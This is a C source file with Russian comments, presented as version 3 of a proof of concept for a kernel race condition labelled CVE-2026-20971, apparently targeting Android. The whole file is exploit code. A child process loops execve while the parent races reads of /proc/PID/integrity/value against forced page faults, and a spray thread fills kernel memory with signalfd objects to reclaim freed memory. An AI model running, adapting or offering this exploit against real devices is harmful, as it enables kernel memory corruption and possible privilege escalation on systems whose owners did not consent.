#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <pthread.h>

// Поток для забивания памяти объектами signalfd
void* spray_thread(void* arg) {
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR1); // Безобидный сигнал

    while(1) {
        // Каждый вызов signalfd создает объект signalfd_ctx в ядре.
        // Мы не закрываем fd, чтобы память не освобождалась.
        int sfd = signalfd(-1, &mask, 0); 
        if (sfd < 0) {
            perror("signalfd spray failed (maybe out of fds)");
            sleep(1); 
        }
    }
    return NULL;
}

int main() {
    // Отключаем буферизацию вывода, чтобы видеть прогресс
    setbuf(stdout, NULL);

    printf("[*] CVE-2026-20971 Race Condition PoC v3\n");
    printf("[*] Added signalfd spray for memory reclamation\n");
    
    // Запускаем поток спрея в родительском процессе
    pthread_t spray_tid;
    pthread_create(&spray_tid, NULL, spray_thread, NULL);

    pid_t pid = fork();

    if (pid == 0) {
        // --- ПРОЦЕСС-ЖЕРТВА (Child) ---
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(1, &set);
        sched_setaffinity(0, sizeof(set), &set);

        char *argv[] = {"/system/bin/true", NULL};
        char *envp[] = {NULL};
        
        while (1) {
            execve("/system/bin/true", argv, envp);
            _exit(1);
        }
    } 
    else if (pid > 0) {
        // --- ПРОЦЕСС-АТАКУЮЩИЙ (Parent) ---
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(0, &set);
        sched_setaffinity(0, sizeof(set), &set);

        printf("[*] Child PID: %d\n", pid);
        
        // Выделяем страницу под чтение (для page fault)
        char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pid);
        
        long iterations = 0;

        while (1) {
            madvise(buf, 4096, MADV_DONTNEED);

            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                // При чтении произойдет page fault, окно гонки откроется.
                // Параллельно поток spray_thread заполняет память signalfd_ctx.
                read(fd, buf, 4096); 
                close(fd);
            }
            
            iterations++;
            if (iterations % 50000 == 0) {
                printf("[*] Iterations: %ld\n", iterations);
            }
            
            if (iterations % 1000 == 0) {
                if (kill(pid, 0) != 0) {
                    printf("[-] Child died unexpectedly.\n");
                    break;
                }
            }
        }
    }
    return 0;
}